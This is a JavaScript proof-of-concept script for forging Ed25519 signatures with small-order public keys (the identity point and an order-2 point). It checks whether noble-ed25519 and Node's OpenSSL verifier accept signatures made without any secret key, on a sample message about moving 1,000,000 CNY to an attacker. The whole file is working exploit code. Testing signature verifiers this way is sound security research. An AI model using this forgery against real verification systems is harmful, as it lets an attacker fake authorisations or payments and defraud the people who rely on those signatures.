// Small-order Ed25519 forgery PoC — noble-ed25519 (audited) point math.
import { ed25519 } from '@noble/curves/ed25519.js';
import { verify as nodeVerify, createPublicKey, createHash } from 'node:crypto';

const l = 2n**252n + 27742317777372353535854737965820589843n;
const VICTIMS = {
  'A=identity(order1)': Buffer.from('01'+'00'.repeat(31),'hex'),
  'A=order2(0,-1)': Buffer.from('ecffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff7f','hex'),
};
const S = (2n**250n + 1234567890123456789n) % l;
const R = ed25519.Point.BASE.multiply(S).toBytes();
const M = Buffer.from('arbitrary receipt: move 1,000,000 CNY to attacker — forged without any secret');
const Sb = Buffer.alloc(32); { let s=S; for(let i=0;i<32;i++){ Sb[i]=Number(s&0xffn); s>>=8n; } }
const sig = Buffer.concat([R, Sb]);
const R2P = (b)=>ed25519.Point.fromBytes(b);

console.log('=== 基线 ===');
const kp = ed25519.keygen(); // v2 API: {secretKey, publicKey}
const realSig = ed25519.sign(M, kp.secretKey);
console.log('noble 真签名自验:', ed25519.verify(realSig, M, kp.publicKey));

console.log('=== 伪造矩阵（公钥=小阶点，签名=R||S，零密钥参与） ===');
for (const [name, A] of Object.entries(VICTIMS)) {
  const hbuf = createHash('sha512').update(Buffer.concat([R, A, M])).digest();
  let kv = 0n; for (let i=63;i>=0;i--) kv=(kv<<8n)|BigInt(hbuf[i]); kv %= l;
  const eq = ed25519.Point.BASE.multiply(S).equals(R2P(R).add(R2P(A).multiply(kv)));
  const noble = (()=>{try{return ed25519.verify(sig,M,A)}catch(e){return 'ERR:'+e.message}})();
  const ossle = (()=>{try{return nodeVerify(null,M,createPublicKey({key:Buffer.concat([Buffer.from('302a300506032b6570032100','hex'),A]),format:'der',type:'spki'}),sig)}catch(e){return 'ERR:'+e.code}})();
  console.log(`${name}`);
  console.log(`  数学方程 S·B==R+k·A 成立: ${eq}`);
  console.log(`  noble verify: ${noble}`);
  console.log(`  node(OpenSSL) verify: ${ossle}`);
}
